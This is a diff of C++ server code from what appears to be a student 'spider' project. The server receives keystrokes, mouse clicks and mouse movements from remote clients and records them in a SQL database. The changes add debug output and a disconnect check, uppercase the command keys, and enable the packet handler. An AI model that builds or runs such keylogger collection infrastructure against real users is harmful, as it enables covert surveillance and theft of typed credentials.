@@ -5,7 +5,7 @@
 // Login   <debrab_t@epitech.net>
 //
 // Started on  Mon Nov  7 10:23:09 2016 debrab_t
-// Last update Sun Nov 13 17:48:47 2016 debrab_t
+// Last update Sun Nov 13 19:45:46 2016 debrab_t
 //
 
 /*
@@ -209,6 +209,9 @@ bool	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
       std::cerr << "Try to add keyboard string but magic number is false..." << std::endl;
       return (false);
     }
+  /*  if (toc.timestamp > _tmsTOC + 2000)
+      _tmsTOC = toc.timestamp;*/
+  std::cout << "----->" << toc.id << std::endl;
   id_client = std::to_string(hea.id);
   data = id_client +
     ", " + std::to_string(toc.timestamp) +
@@ -253,10 +256,16 @@ bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
 
   dec = packet.getData<PackageCMDLogOut>();
   hea = packet.getHeader();
+  if (hea.magicNumber != SEND)
+    {
+      std::cerr << "Try to disconnect but magic number is false..." << std::endl;
+      return (false);
+    }
   id_client = std::to_string(hea.id);
   if (isClient(id_client) && isClientState(id_client))
     {
       sqlMan.updateData("client", "state = FALSE WHERE CLIENT_ID=" + id_client);
+      hea.magicNumber = REC;
       ans.header = hea;
       ans.code = 208;
       std::strncpy(ans.cmd, "DEC", 3);
@@ -269,27 +278,27 @@ bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
 
 void	SqlServer::feedPointMap()
 {
-  _pointMap.insert(std::pair<std::string,bddFunc>("idn", &SqlServer::connectClient));
-  _pointMap.insert(std::pair<std::string,bddFunc>("clc", &SqlServer::addMouseClick));
-  _pointMap.insert(std::pair<std::string,bddFunc>("mvt", &SqlServer::addMouseMouvement));
-  _pointMap.insert(std::pair<std::string,bddFunc>("toc", &SqlServer::addKeyboardString));
-  _pointMap.insert(std::pair<std::string,bddFunc>("dec",  &SqlServer::disconnectClient));
-  _pointMap.insert(std::pair<std::string,bddFunc>("shu",  &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("tal",  &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("pin",  &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("sin",  &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("nor",  &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("mod",  &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("IDN", &SqlServer::connectClient));
+  _pointMap.insert(std::pair<std::string,bddFunc>("CLC", &SqlServer::addMouseClick));
+  _pointMap.insert(std::pair<std::string,bddFunc>("MVT", &SqlServer::addMouseMouvement));
+  _pointMap.insert(std::pair<std::string,bddFunc>("TOC", &SqlServer::addKeyboardString));
+  _pointMap.insert(std::pair<std::string,bddFunc>("DEC", &SqlServer::disconnectClient));
+  _pointMap.insert(std::pair<std::string,bddFunc>("SHU", &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("TAL", &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("PIN", &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("SIN", &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("NOR", &SqlServer::response));
+  _pointMap.insert(std::pair<std::string,bddFunc>("MOD", &SqlServer::response));
 }
 
 bool		SqlServer::handleData(spider::PacketUnserializer &packet, std::shared_ptr<spider::socket::user> usr)
 {
-  return (false);
+  //return (false);
   std::string	stringPacket(packet.getPacketType(), 0, 3);
   bool		ret = false;
 
   _user = usr;
-  strMan.toLowerCase(stringPacket);
+  std::cout << "PACKET--->" << stringPacket << std::endl;
   if (!_cnt)
     return (false);
   else if (_pointMap.find(stringPacket) != _pointMap.end())
